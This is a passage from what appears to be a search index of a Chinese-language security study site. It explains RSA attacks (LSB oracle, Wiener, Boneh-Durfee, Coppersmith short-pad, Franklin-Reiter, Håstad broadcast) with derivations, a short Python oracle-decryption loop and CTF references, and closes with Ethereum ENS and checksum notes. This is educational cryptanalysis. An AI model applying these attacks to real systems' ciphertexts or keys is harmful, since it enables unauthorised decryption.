[0, \\frac{n}{2}) \uff0c\u90a3 2m \\in [0, n) 2m \\in [0, n) \uff0c\u4e14 2m \\text{ mod } n = 2m 2m \\text{ mod } n = 2m \u662f\u5076\u6578 \u5047\u8a2d\u660e\u6587 m \\in [\\frac{n}{2}, n) m \\in [\\frac{n}{2}, n) \uff0c\u90a3 2m \\in [n, 2n) 2m \\in [n, 2n) \uff0c\u4e14 2m \\text{ mod } n = 2m - n 2m \\text{ mod } n = 2m - n \u662f\u5947\u6578 ( n n \u662f\u5947\u6578 ) \u7d66 server 2^ec 2^ec \u4e26\u5f97\u5230 LSB(2m \\text{ mod } n) LSB(2m \\text{ mod } n) \u5c31\u53ef\u4ee5\u5224\u65b7 m m \u662f\u843d\u54ea\u500b\u7bc4\u570d \u5df2\u77e5\u660e\u6587 m \\in [0, \\frac{n}{2}) m \\in [0, \\frac{n}{2}) \u5047\u8a2d\u660e\u6587 m \\in [0, \\frac{n}{4}) m \\in [0, \\frac{n}{4}) \uff0c\u90a3 4m \\in [0, n) 4m \\in [0, n) \uff0c\u4e14 4m \\text{ mod } n = 4m 4m \\text{ mod } n = 4m \u662f\u5076\u6578 \u5047\u8a2d\u660e\u6587 m \\in [\\frac{n}{4}, \\frac{2n}{4}) m \\in [\\frac{n}{4}, \\frac{2n}{4}) \uff0c\u90a3 4m \\in [n, 2n) 4m \\in [n, 2n) \uff0c\u4e14 4m \\text{ mod } n = 4m - n 4m \\text{ mod } n = 4m - n \u662f\u5947\u6578 \u5df2\u77e5\u660e\u6587 m \\in [\\frac{n}{2}, n) m \\in [\\frac{n}{2}, n) \u5047\u8a2d\u660e\u6587 m \\in [\\frac{2n}{4}, \\frac{3n}{4}) m \\in [\\frac{2n}{4}, \\frac{3n}{4}) \uff0c\u90a3 4m \\in [2n, 3n) 4m \\in [2n, 3n) \uff0c\u4e14 4m \\text{ mod } n = 4m - 2n 4m \\text{ mod } n = 4m - 2n \u662f\u5076\u6578 \u5047\u8a2d\u660e\u6587 m \\in [\\frac{3n}{4}, n) m \\in [\\frac{3n}{4}, n) \uff0c\u90a3 4m \\in [3n, 4n) 4m \\in [3n, 4n) \uff0c\u4e14 4m \\text{ mod } n = 4m - 3n 4m \\text{ mod } n = 4m - 3n \u662f\u5947\u6578 \u7d66 server 4^ec 4^ec \u4e26\u5f97\u5230 LSB(4m \\text{ mod } n) LSB(4m \\text{ mod } n) \u5c31\u53ef\u4ee5\u5224\u65b7 m m \u662f\u843d\u54ea\u500b\u7bc4\u570d \u63a5\u4e0b\u4f86\u4e5f\u662f\u505a\u4e00\u6a23\u7684\u4e8b\u60c5\uff0c\u4e00\u6b65\u6b65\u628a\u7bc4\u570d\u7e2e\u5c0f\u4e00\u534a\uff0c\u5c31\u662f\u4e8c\u5206\u641c\uff0c\u7e3d\u5171\u9700\u8981 \\text{log}_2(n) \\text{log}_2(n) \u500b\u6b65\u9a5f","title":"\u653b\u64ca\u624b\u6cd5"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/#python","text":"L = 0 H = n t = pow ( 2 , e , n ) for _ in range ( n . bit_length ()): c = ( t * c ) % n if oracle ( c ) == 0 : H = ( L + H ) // 2 else : L = ( L + H ) // 2 m = L # plain text","title":"\u7a0b\u5f0f\u78bc ( python )"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/#ctf","text":"Google CTF 2018 Quals - PERFECT SECRECY","title":"CTF \u984c\u76ee"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/#_3","text":"http://blog.chrstm.com/2018/04/18/RSA_LSB_Oracle_Attack/","title":"\u76f8\u95dc\u8cc7\u6599"},{"location":"security/crypto/asymmetric/rsa/wiener/","text":"Wiener's attack \u6211\u5011\u5df2\u77e5\u516c\u9470\uff0c\u4e5f\u5c31\u662f (n, e) (n, e) \u89c0\u5bdf\u4e00 \\begin{aligned} \\varphi(n) &= (p-1)(q-1) \\\\ &= n - p - q + 1 \\\\ &= n - p - \\frac{n}{p} + 1 \\end{aligned} \\begin{aligned} \\varphi(n) &= (p-1)(q-1) \\\\ &= n - p - q + 1 \\\\ &= n - p - \\frac{n}{p} + 1 \\end{aligned} \u79fb\u9805\u4e00\u4e0b p^2 + p(\\varphi(n) - n - 1) + n = 0 p^2 + p(\\varphi(n) - n - 1) + n = 0 \u6211\u5011\u5c31\u5f97\u5230\u4e86\u4e00\u500b p p \u7684\u4e8c\u6b21\u5f0f\uff0c\u53ea\u8981\u6211\u5011\u77e5\u9053 \\varphi(n) \\varphi(n) \u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa\u5169\u500b\u6839 p_1, p_2 p_1, p_2 p_1, p_2 p_1, p_2 \u5c31\u662f\u6211\u5011\u7684 p, q p, q \uff0c\u800c\u6211\u5011\u5c31\u6210\u529f\u5206\u89e3 n n \u4e86 \u89c0\u5bdf\u4e8c \u6211\u5011\u77e5\u9053 ed \\equiv 1 \\pmod{\\varphi(n)} ed \\equiv 1 \\pmod{\\varphi(n)} \u6240\u4ee5 ed = k\\varphi(n) + 1 ed = k\\varphi(n) + 1 for some k k \u90a3\u9ebc \\varphi(n) = \\frac{ed - 1}{k} \\varphi(n) = \\frac{ed - 1}{k} \uff0c\u53ea\u8981\u6211\u5011\u77e5\u9053 k, d k, d \u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa \\varphi(n) \\varphi(n) Wiener's attack \u6839\u64da\u525b\u525b\u7684 \u89c0\u5bdf\u4e00 \u548c \u89c0\u5bdf\u4e8c \uff0c\u6211\u5011\u53ea\u8981\u77e5\u9053 k, d k, d \u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa p, q p, q \uff0c\u4e5f\u5c31\u662f\u6210\u529f\u5206\u89e3 n n \u90a3\u9019\u500b wiener's attack \u5176\u5be6\u5c31\u662f\u63d0\u4f9b\u4f60\u4e00\u500b\u731c k, d k, d \u7684\u65b9\u5f0f \u9996\u5148\u627e\u51fa convergents of the continued fraction expansion of \\frac{e}{n} \\frac{e}{n} ( \u8907\u7fd2 \u9023\u5206\u6578 ? ) \u5047\u8a2d\u4ed6\u5011\u662f \\frac{k_i}{d_i} \\frac{k_i}{d_i} \u6211\u5011\u5c31\u731c k = k_i, d = d_i k = k_i, d = d_i \u7136\u5f8c\u6839\u64da\u4e0a\u9762\u5169\u500b\u89c0\u5bdf\u89e3\u56de p_1, p_2 p_1, p_2 \u7136\u5f8c\u6aa2\u67e5 p_1p_2 p_1p_2 \u662f\u5426\u7b49\u65bc n n \uff0c\u4e0d\u662f\u7684\u8a71\u5c31\u63db\u4e0b\u4e00\u500b convergent \u9650\u5236 \u7576 d < \\frac{1}{3}n^{\\frac{1}{4}} d < \\frac{1}{3}n^{\\frac{1}{4}} \uff0c\u9019\u500b\u65b9\u6cd5\u4fdd\u8b49\u80fd\u627e\u5230\u5c0d\u7684 k, d k, d \uff0c\u9032\u800c\u5206\u89e3 n n \u6642\u9593\u8907\u96dc\u5ea6 \u77e5\u9053 k, d k, d \u4e4b\u5f8c\uff0c\u56de\u63a8 \\varphi(n) \\varphi(n) \u53ea\u9700\u8981 O(1) O(1) \u77e5\u9053 \\varphi(n) \\varphi(n) \u4e4b\u5f8c\uff0c\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u5f0f\u4e5f\u53ea\u9700\u8981 O(1) O(1) \u89c0\u5bdf\u5230\u8a08\u7b97 continued fraction expansion \u6642\uff0c\u5176\u5be6\u662f\u5728\u505a\u8f3e\u8f49\u76f8\u9664\u6cd5 \u6240\u4ee5\u5617\u8a66\u6240\u6709\u7684 convergents \u9700\u8981 O(log(min(e, n))) O(log(min(e, n))) ( \u8f3e\u8f49\u76f8\u9664\u6cd5 a, b a, b \u7684\u6642\u9593\u8907\u96dc\u5ea6\u662f O(log(min(a, b))) O(log(min(a, b))) ) \u800c\u6211\u5011\u77e5\u9053 e < \\varphi(n) < n e < \\varphi(n) < n \uff0c\u6240\u4ee5\u6642\u9593\u8907\u96dc\u5ea6\u662f O(log(e)) O(log(e)) \u8a3b\u8a18 wiener attack \u6709\u5169\u7a2e\u7248\u672c \u539f\u59cb\u8ad6\u6587\u4e2d\u7684\u662f\u91dd\u5c0d r = \\lambda(n) r = \\lambda(n) \u6211\u524d\u9762\u8b1b\u7684\u662f\u91dd\u5c0d r = \\varphi(n) r = \\varphi(n) \u4e2d\u9593\u904e\u7a0b\u4e0d\u540c\u4f46\u90fd\u53ef\u4ee5\u5206\u89e3 n = p q n = p q \u53c3\u8003\u8cc7\u6599 sagi's blog Cryptanalysis of Short RSA Secret Exponents","title":"Wiener's Attack"},{"location":"security/crypto/asymmetric/rsa/wiener/#wieners-attack","text":"\u6211\u5011\u5df2\u77e5\u516c\u9470\uff0c\u4e5f\u5c31\u662f (n, e) (n, e)","title":"Wiener's attack"},{"location":"security/crypto/asymmetric/rsa/wiener/#_1","text":"\\begin{aligned} \\varphi(n) &= (p-1)(q-1) \\\\ &= n - p - q + 1 \\\\ &= n - p - \\frac{n}{p} + 1 \\end{aligned} \\begin{aligned} \\varphi(n) &= (p-1)(q-1) \\\\ &= n - p - q + 1 \\\\ &= n - p - \\frac{n}{p} + 1 \\end{aligned} \u79fb\u9805\u4e00\u4e0b p^2 + p(\\varphi(n) - n - 1) + n = 0 p^2 + p(\\varphi(n) - n - 1) + n = 0 \u6211\u5011\u5c31\u5f97\u5230\u4e86\u4e00\u500b p p \u7684\u4e8c\u6b21\u5f0f\uff0c\u53ea\u8981\u6211\u5011\u77e5\u9053 \\varphi(n) \\varphi(n) \u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa\u5169\u500b\u6839 p_1, p_2 p_1, p_2 p_1, p_2 p_1, p_2 \u5c31\u662f\u6211\u5011\u7684 p, q p, q \uff0c\u800c\u6211\u5011\u5c31\u6210\u529f\u5206\u89e3 n n \u4e86","title":"\u89c0\u5bdf\u4e00"},{"location":"security/crypto/asymmetric/rsa/wiener/#_2","text":"\u6211\u5011\u77e5\u9053 ed \\equiv 1 \\pmod{\\varphi(n)} ed \\equiv 1 \\pmod{\\varphi(n)} \u6240\u4ee5 ed = k\\varphi(n) + 1 ed = k\\varphi(n) + 1 for some k k \u90a3\u9ebc \\varphi(n) = \\frac{ed - 1}{k} \\varphi(n) = \\frac{ed - 1}{k} \uff0c\u53ea\u8981\u6211\u5011\u77e5\u9053 k, d k, d \u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa \\varphi(n) \\varphi(n)","title":"\u89c0\u5bdf\u4e8c"},{"location":"security/crypto/asymmetric/rsa/wiener/#wieners-attack_1","text":"\u6839\u64da\u525b\u525b\u7684 \u89c0\u5bdf\u4e00 \u548c \u89c0\u5bdf\u4e8c \uff0c\u6211\u5011\u53ea\u8981\u77e5\u9053 k, d k, d \u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa p, q p, q \uff0c\u4e5f\u5c31\u662f\u6210\u529f\u5206\u89e3 n n \u90a3\u9019\u500b wiener's attack \u5176\u5be6\u5c31\u662f\u63d0\u4f9b\u4f60\u4e00\u500b\u731c k, d k, d \u7684\u65b9\u5f0f \u9996\u5148\u627e\u51fa convergents of the continued fraction expansion of \\frac{e}{n} \\frac{e}{n} ( \u8907\u7fd2 \u9023\u5206\u6578 ? ) \u5047\u8a2d\u4ed6\u5011\u662f \\frac{k_i}{d_i} \\frac{k_i}{d_i} \u6211\u5011\u5c31\u731c k = k_i, d = d_i k = k_i, d = d_i \u7136\u5f8c\u6839\u64da\u4e0a\u9762\u5169\u500b\u89c0\u5bdf\u89e3\u56de p_1, p_2 p_1, p_2 \u7136\u5f8c\u6aa2\u67e5 p_1p_2 p_1p_2 \u662f\u5426\u7b49\u65bc n n \uff0c\u4e0d\u662f\u7684\u8a71\u5c31\u63db\u4e0b\u4e00\u500b convergent","title":"Wiener's attack"},{"location":"security/crypto/asymmetric/rsa/wiener/#_3","text":"\u7576 d < \\frac{1}{3}n^{\\frac{1}{4}} d < \\frac{1}{3}n^{\\frac{1}{4}} \uff0c\u9019\u500b\u65b9\u6cd5\u4fdd\u8b49\u80fd\u627e\u5230\u5c0d\u7684 k, d k, d \uff0c\u9032\u800c\u5206\u89e3 n n","title":"\u9650\u5236"},{"location":"security/crypto/asymmetric/rsa/wiener/#_4","text":"\u77e5\u9053 k, d k, d \u4e4b\u5f8c\uff0c\u56de\u63a8 \\varphi(n) \\varphi(n) \u53ea\u9700\u8981 O(1) O(1) \u77e5\u9053 \\varphi(n) \\varphi(n) \u4e4b\u5f8c\uff0c\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u5f0f\u4e5f\u53ea\u9700\u8981 O(1) O(1) \u89c0\u5bdf\u5230\u8a08\u7b97 continued fraction expansion \u6642\uff0c\u5176\u5be6\u662f\u5728\u505a\u8f3e\u8f49\u76f8\u9664\u6cd5 \u6240\u4ee5\u5617\u8a66\u6240\u6709\u7684 convergents \u9700\u8981 O(log(min(e, n))) O(log(min(e, n))) ( \u8f3e\u8f49\u76f8\u9664\u6cd5 a, b a, b \u7684\u6642\u9593\u8907\u96dc\u5ea6\u662f O(log(min(a, b))) O(log(min(a, b))) ) \u800c\u6211\u5011\u77e5\u9053 e < \\varphi(n) < n e < \\varphi(n) < n \uff0c\u6240\u4ee5\u6642\u9593\u8907\u96dc\u5ea6\u662f O(log(e)) O(log(e))","title":"\u6642\u9593\u8907\u96dc\u5ea6"},{"location":"security/crypto/asymmetric/rsa/wiener/#_5","text":"wiener attack \u6709\u5169\u7a2e\u7248\u672c \u539f\u59cb\u8ad6\u6587\u4e2d\u7684\u662f\u91dd\u5c0d r = \\lambda(n) r = \\lambda(n) \u6211\u524d\u9762\u8b1b\u7684\u662f\u91dd\u5c0d r = \\varphi(n) r = \\varphi(n) \u4e2d\u9593\u904e\u7a0b\u4e0d\u540c\u4f46\u90fd\u53ef\u4ee5\u5206\u89e3 n = p q n = p q","title":"\u8a3b\u8a18"},{"location":"security/crypto/asymmetric/rsa/wiener/#_6","text":"sagi's blog Cryptanalysis of Short RSA Secret Exponents","title":"\u53c3\u8003\u8cc7\u6599"},{"location":"security/crypto/asymmetric/rsa/coppersmith/boneh-and-durfee/","text":"Boneh and Durfee Attack \u7576 d < n ^ 0.292 d < n ^ 0.292 \u6211\u5011\u53ef\u4ee5\u5206\u89e3 n n \u53ef\u4ee5\u4f7f\u7528 RSA-and-LLL-attacks \u9019\u500b\u5de5\u5177","title":"Boneh and Durfee Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/boneh-and-durfee/#boneh-and-durfee-attack","text":"\u7576 d < n ^ 0.292 d < n ^ 0.292 \u6211\u5011\u53ef\u4ee5\u5206\u89e3 n n \u53ef\u4ee5\u4f7f\u7528 RSA-and-LLL-attacks \u9019\u500b\u5de5\u5177","title":"Boneh and Durfee Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/coppersmith-short-pad/","text":"Coppersmith\u2019s Short-Pad Attack \u5047\u8a2d\u6211\u5011\u6709\u516c\u9470 (n, e) (n, e) \u4f7f\u7528\u516c\u9470\u52a0\u5bc6\u5169\u500b\u660e\u6587 m_1, m_2 m_1, m_2 \u70ba c_1, c_2 c_1, c_2 \uff0c\u5176\u4e2d m_1 = 2^m M + r_1, m_2 = 2^m M + r_2 m_1 = 2^m M + r_1, m_2 = 2^m M + r_2 r_1, r_2 r_1, r_2 \u70ba\u672a\u77e5 padding\uff0c M M \u70ba\u771f\u6b63\u7684\u660e\u6587 \u8a2d g_1(x, y) = x ^ e - C_1, g_2(x, y) = (x + y) ^ e - C_2 g_1(x, y) = x ^ e - C_1, g_2(x, y) = (x + y) ^ e - C_2 \u7576 y = r_2 - r_1 y = r_2 - r_1 \uff0c g_1, g_2 g_1, g_2 \u6709 common root x = m_1 x = m_1 \u8a2d h(y) = res_x(g_1, g_2) h(y) = res_x(g_1, g_2) \u6211\u5011\u77e5\u9053 resultant \u6709\u4e00\u500b\u7279\u6027\u662f\uff0c g_1, g_2 g_1, g_2 \u6709 common root \u82e5\u4e14\u552f\u82e5 res(g_1, g_2) = 0 res(g_1, g_2) = 0 \u6240\u4ee5\u6211\u5011\u5c31\u7528 coppersmith method \u6c42 h(y) h(y) \u7684 root \u6c42\u5f97 root \u5f8c\u6211\u5011\u5c31\u77e5\u9053 y y \uff0c\u63a5\u4e0b\u4f86\u5c31\u5957\u7528 Franklin-Reiter Related Message Attack \u5373\u53ef CTF \u984c\u76ee CONFidence CTF 2015 \u2013 RSA1","title":"Coppersmith\u2019s Short-Pad Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/coppersmith-short-pad/#coppersmiths-short-pad-attack","text":"\u5047\u8a2d\u6211\u5011\u6709\u516c\u9470 (n, e) (n, e) \u4f7f\u7528\u516c\u9470\u52a0\u5bc6\u5169\u500b\u660e\u6587 m_1, m_2 m_1, m_2 \u70ba c_1, c_2 c_1, c_2 \uff0c\u5176\u4e2d m_1 = 2^m M + r_1, m_2 = 2^m M + r_2 m_1 = 2^m M + r_1, m_2 = 2^m M + r_2 r_1, r_2 r_1, r_2 \u70ba\u672a\u77e5 padding\uff0c M M \u70ba\u771f\u6b63\u7684\u660e\u6587 \u8a2d g_1(x, y) = x ^ e - C_1, g_2(x, y) = (x + y) ^ e - C_2 g_1(x, y) = x ^ e - C_1, g_2(x, y) = (x + y) ^ e - C_2 \u7576 y = r_2 - r_1 y = r_2 - r_1 \uff0c g_1, g_2 g_1, g_2 \u6709 common root x = m_1 x = m_1 \u8a2d h(y) = res_x(g_1, g_2) h(y) = res_x(g_1, g_2) \u6211\u5011\u77e5\u9053 resultant \u6709\u4e00\u500b\u7279\u6027\u662f\uff0c g_1, g_2 g_1, g_2 \u6709 common root \u82e5\u4e14\u552f\u82e5 res(g_1, g_2) = 0 res(g_1, g_2) = 0 \u6240\u4ee5\u6211\u5011\u5c31\u7528 coppersmith method \u6c42 h(y) h(y) \u7684 root \u6c42\u5f97 root \u5f8c\u6211\u5011\u5c31\u77e5\u9053 y y \uff0c\u63a5\u4e0b\u4f86\u5c31\u5957\u7528 Franklin-Reiter Related Message Attack \u5373\u53ef","title":"Coppersmith\u2019s Short-Pad Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/coppersmith-short-pad/#ctf","text":"CONFidence CTF 2015 \u2013 RSA1","title":"CTF \u984c\u76ee"},{"location":"security/crypto/asymmetric/rsa/coppersmith/coppersmith/","text":"Coppersmith Method \u7d66\u6574\u6578 n n \uff0c f \\in \\mathbb{Z}[x] f \\in \\mathbb{Z}[x] \u662f\u4e00\u500b degree d d \u7684 monic polynomial \u7528 coppersmith method \u53ef\u4ee5\u627e\u5230\u6240\u6709 x_0 < n^{\\frac{1}{d} - \\epsilon}, \\frac{1}{d} > \\epsilon > 0 x_0 < n^{\\frac{1}{d} - \\epsilon}, \\frac{1}{d} > \\epsilon > 0 \u4f7f\u5f97 f(x_0) = 0 f(x_0) = 0 \u5728 sage \u4e2d\u7684\u5be6\u4f5c\u53eb\u505a small_root \u76f8\u95dc\u8cc7\u6e90 A New Related Message Attack on RSA Low-Exponent RSA with Related Messages","title":"Coppersmith Method"},{"location":"security/crypto/asymmetric/rsa/coppersmith/coppersmith/#coppersmith-method","text":"\u7d66\u6574\u6578 n n \uff0c f \\in \\mathbb{Z}[x] f \\in \\mathbb{Z}[x] \u662f\u4e00\u500b degree d d \u7684 monic polynomial \u7528 coppersmith method \u53ef\u4ee5\u627e\u5230\u6240\u6709 x_0 < n^{\\frac{1}{d} - \\epsilon}, \\frac{1}{d} > \\epsilon > 0 x_0 < n^{\\frac{1}{d} - \\epsilon}, \\frac{1}{d} > \\epsilon > 0 \u4f7f\u5f97 f(x_0) = 0 f(x_0) = 0 \u5728 sage \u4e2d\u7684\u5be6\u4f5c\u53eb\u505a small_root","title":"Coppersmith Method"},{"location":"security/crypto/asymmetric/rsa/coppersmith/coppersmith/#_1","text":"A New Related Message Attack on RSA Low-Exponent RSA with Related Messages","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/rsa/coppersmith/franklin-reiter/","text":"Franklin-Reiter Related Message Attack \u5047\u8a2d\u6211\u5011\u6709\u516c\u9470 (n, e) (n, e) \u4f7f\u7528\u516c\u9470\u52a0\u5bc6\u5169\u500b\u660e\u6587 m_1, m_2 m_1, m_2 \u70ba c_1, c_2 c_1, c_2 \uff0c\u4e14\u5169\u500b\u660e\u6587\u6eff\u8db3 m_1 = f(m_2) m_1 = f(m_2) \uff0c f f \u662f\u5728\u6a21 n n \u4e0b\u7684\u591a\u9805\u5f0f m_1^e \\equiv c_1 \\pmod{n} m_1^e \\equiv c_1 \\pmod{n} \uff0c\u90a3\u9ebc m_2 m_2 \u662f g_1(x) = f(x)^e - c_1 \\in \\mathbb{Z}_{n}[x] g_1(x) = f(x)^e - c_1 \\in \\mathbb{Z}_{n}[x] \u7684\u6839 m_2^e \\equiv c_2 \\pmod{n} m_2^e \\equiv c_2 \\pmod{n} \uff0c\u90a3\u9ebc m_2 m_2 \u662f g_2(x) = x^e - c_2 \\in \\mathbb{Z}_{n}[x] g_2(x) = x^e - c_2 \\in \\mathbb{Z}_{n}[x] \u7684\u6839 \u6240\u4ee5 x - m_2 x - m_2 \u53ef\u4ee5\u6574\u9664 g_1, g_2 g_1, g_2 \u6211\u5011\u53ea\u8981\u8a08\u7b97 gcd(g_1, g_2) gcd(g_1, g_2) \u5c31\u53ef\u4ee5\u89e3\u51fa m_2 m_2 \u6ce8\u610f\u5230\u4e0a\u9762\u7684\u8a08\u7b97\u5305\u62ec\u591a\u9805\u5f0f\u90fd\u662f\u5728\u6a21 n n \u4e0b\u8a08\u7b97 \u800c\u7576 e = 3 e = 3 \u4e14 f(x) = ax + b f(x) = ax + b \u6642 m_2 = \\frac{b}{a}\\frac{c_1 + 2a^3c_2 - b^3}{c_1 - a^3c_2 + 2b^3} m_2 = \\frac{b}{a}\\frac{c_1 + 2a^3c_2 - b^3}{c_1 - a^3c_2 + 2b^3} CTF \u984c\u76ee HITCON CTF QUALS 2014 - rsaha","title":"Franklin-Reiter Related Message Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/franklin-reiter/#franklin-reiter-related-message-attack","text":"\u5047\u8a2d\u6211\u5011\u6709\u516c\u9470 (n, e) (n, e) \u4f7f\u7528\u516c\u9470\u52a0\u5bc6\u5169\u500b\u660e\u6587 m_1, m_2 m_1, m_2 \u70ba c_1, c_2 c_1, c_2 \uff0c\u4e14\u5169\u500b\u660e\u6587\u6eff\u8db3 m_1 = f(m_2) m_1 = f(m_2) \uff0c f f \u662f\u5728\u6a21 n n \u4e0b\u7684\u591a\u9805\u5f0f m_1^e \\equiv c_1 \\pmod{n} m_1^e \\equiv c_1 \\pmod{n} \uff0c\u90a3\u9ebc m_2 m_2 \u662f g_1(x) = f(x)^e - c_1 \\in \\mathbb{Z}_{n}[x] g_1(x) = f(x)^e - c_1 \\in \\mathbb{Z}_{n}[x] \u7684\u6839 m_2^e \\equiv c_2 \\pmod{n} m_2^e \\equiv c_2 \\pmod{n} \uff0c\u90a3\u9ebc m_2 m_2 \u662f g_2(x) = x^e - c_2 \\in \\mathbb{Z}_{n}[x] g_2(x) = x^e - c_2 \\in \\mathbb{Z}_{n}[x] \u7684\u6839 \u6240\u4ee5 x - m_2 x - m_2 \u53ef\u4ee5\u6574\u9664 g_1, g_2 g_1, g_2 \u6211\u5011\u53ea\u8981\u8a08\u7b97 gcd(g_1, g_2) gcd(g_1, g_2) \u5c31\u53ef\u4ee5\u89e3\u51fa m_2 m_2 \u6ce8\u610f\u5230\u4e0a\u9762\u7684\u8a08\u7b97\u5305\u62ec\u591a\u9805\u5f0f\u90fd\u662f\u5728\u6a21 n n \u4e0b\u8a08\u7b97 \u800c\u7576 e = 3 e = 3 \u4e14 f(x) = ax + b f(x) = ax + b \u6642 m_2 = \\frac{b}{a}\\frac{c_1 + 2a^3c_2 - b^3}{c_1 - a^3c_2 + 2b^3} m_2 = \\frac{b}{a}\\frac{c_1 + 2a^3c_2 - b^3}{c_1 - a^3c_2 + 2b^3}","title":"Franklin-Reiter Related Message Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/franklin-reiter/#ctf","text":"HITCON CTF QUALS 2014 - rsaha","title":"CTF \u984c\u76ee"},{"location":"security/crypto/asymmetric/rsa/coppersmith/hastad/","text":"H\u00e5stad's Broadcast Attack \u5047\u8a2d\u67d0\u4eba\u5c07\u540c\u4e00\u500b\u8a0a\u606f m m \u4f7f\u7528\u4e0d\u540c\u7684 n_1, n_2, \\cdots n_k n_1, n_2, \\cdots n_k \u76f8\u540c\u7684 e = 3 e = 3 \u52a0\u5bc6\u6210 c_1, c_2, \\cdots c_k c_1, c_2, \\cdots c_k \u9001\u7d66 k k \u500b\u4eba \u53ea\u8981 k \\ge e = 3 k \\ge e = 3 \uff0c\u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa m m m^3 \\equiv c_1 \\pmod{n_1} \\\\ m^3 \\equiv c_2 \\pmod{n_2} \\\\ m^3 \\equiv c_3 \\pmod{n_3} m^3 \\equiv c_1 \\pmod{n_1} \\\\ m^3 \\equiv c_2 \\pmod{n_2} \\\\ m^3 \\equiv c_3 \\pmod{n_3} \u6839\u64da\u4e2d\u570b\u5269\u9918\u5b9a\u7406\uff0c m^3 m^3 \u5728\u6a21 n_1n_2n_3 n_1n_2n_3 \u4e0b\u6709\u4e00\u500b\u552f\u4e00\u89e3 c c \u4e5f\u5c31\u662f m^3 \\equiv c \\pmod{n_1n_2n_3} m^3 \\equiv c \\pmod{n_1n_2n_3} \u800c\u56e0\u70ba m \\lt n_i\\ \\forall 1 \\le i \\le 3 m \\lt n_i\\ \\forall 1 \\le i \\le 3 \uff0c\u6240\u4ee5 m^3 \\lt n_1n_2n_3 m^3 \\lt n_1n_2n_3 \uff0c\u6240\u4ee5 m^3 = c m^3 = c \u90a3\u6211\u5011\u7528\u6c42\u51fa c c \u5f8c\u5c31\u53ef\u4ee5\u89e3\u51fa m = \\sqrt[3]{c} m = \\sqrt[3]{c}","title":"H\u00e5stad's Broadcast Attack"},{"location":"security/crypto/asymmetric/rsa/coppersmith/hastad/#hastads-broadcast-attack","text":"\u5047\u8a2d\u67d0\u4eba\u5c07\u540c\u4e00\u500b\u8a0a\u606f m m \u4f7f\u7528\u4e0d\u540c\u7684 n_1, n_2, \\cdots n_k n_1, n_2, \\cdots n_k \u76f8\u540c\u7684 e = 3 e = 3 \u52a0\u5bc6\u6210 c_1, c_2, \\cdots c_k c_1, c_2, \\cdots c_k \u9001\u7d66 k k \u500b\u4eba \u53ea\u8981 k \\ge e = 3 k \\ge e = 3 \uff0c\u6211\u5011\u5c31\u53ef\u4ee5\u89e3\u51fa m m m^3 \\equiv c_1 \\pmod{n_1} \\\\ m^3 \\equiv c_2 \\pmod{n_2} \\\\ m^3 \\equiv c_3 \\pmod{n_3} m^3 \\equiv c_1 \\pmod{n_1} \\\\ m^3 \\equiv c_2 \\pmod{n_2} \\\\ m^3 \\equiv c_3 \\pmod{n_3} \u6839\u64da\u4e2d\u570b\u5269\u9918\u5b9a\u7406\uff0c m^3 m^3 \u5728\u6a21 n_1n_2n_3 n_1n_2n_3 \u4e0b\u6709\u4e00\u500b\u552f\u4e00\u89e3 c c \u4e5f\u5c31\u662f m^3 \\equiv c \\pmod{n_1n_2n_3} m^3 \\equiv c \\pmod{n_1n_2n_3} \u800c\u56e0\u70ba m \\lt n_i\\ \\forall 1 \\le i \\le 3 m \\lt n_i\\ \\forall 1 \\le i \\le 3 \uff0c\u6240\u4ee5 m^3 \\lt n_1n_2n_3 m^3 \\lt n_1n_2n_3 \uff0c\u6240\u4ee5 m^3 = c m^3 = c \u90a3\u6211\u5011\u7528\u6c42\u51fa c c \u5f8c\u5c31\u53ef\u4ee5\u89e3\u51fa m = \\sqrt[3]{c} m = \\sqrt[3]{c}","title":"H\u00e5stad's Broadcast Attack"},{"location":"security/crypto/blockchain/basics/","text":"ENS \u5c31\u8ddf DNS \u7684\u529f\u80fd\u4e00\u6a23\uff0c\u628a\u8907\u96dc\u7684\u5730\u5740\u5c0d\u61c9\u5230\u4e00\u500b human-readable \u7684\u5b57\u4e32\uff0c\u6bd4\u5982 buymecoffee.eth enslisting.com \u662f\u820a\u7684\u670d\u52d9\uff0c\u7528 5 day vickery auction \u4f86\u7af6\u6a19 manager.ens.domains \u662f\u65b0\u7684\u670d\u52d9\uff0c2019/05/04 \u4e0a\u7dda\uff0c\u4e0d\u7528\u518d\u7b49\u4e94\u5929\u7af6\u6a19\u9019\u9ebc\u4e45\u4e86 ENS \u7684\u672c\u9ad4\u5176\u5be6\u5c31\u662f\u4e00\u500b\u667a\u6167\u5408\u7d04\uff0c\u770b\u770b\u9019\u500b \u2192 ens Ethereum Address Checksum Ethereum \u7684\u4f4d\u5740\u662f\u7528\u5927\u5c0f\u5beb\u4f86\u7576 checksum\uff0c\u5982\u679c checksum \u932f\u4e86 web3 \u6703\u5674\u932f \u53ef\u4ee5\u53eb web3 \u5e6b\u4f60\u505a checksum web3.toChecksumAddress('ADDRESS') \u5be6\u4f5c\u865b\u64ec\u78bc 1 function toChecksumAddress () { let hash = keccak256 ( address ) let ans = '0x' for ( let i = 0 ; i < address . length ; i ++ ) { if ( parseInt ( hash [ i ], 16 ) >= 8 ) ans += address [ i ]. toUpperCase () else ans += address [ i ] } return ans } SHA3 \u8207 Keccak256 \u7684\u5340\u5225 2 \u7c21\u55ae\u4f86\u8aaa Keccak256 \u662f\u6307\u539f\u672c\u7684 SHA3 SHA3 \u662f\u6307 NIST \u6a19\u6e96\u7684 SHA3 https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md#implementation 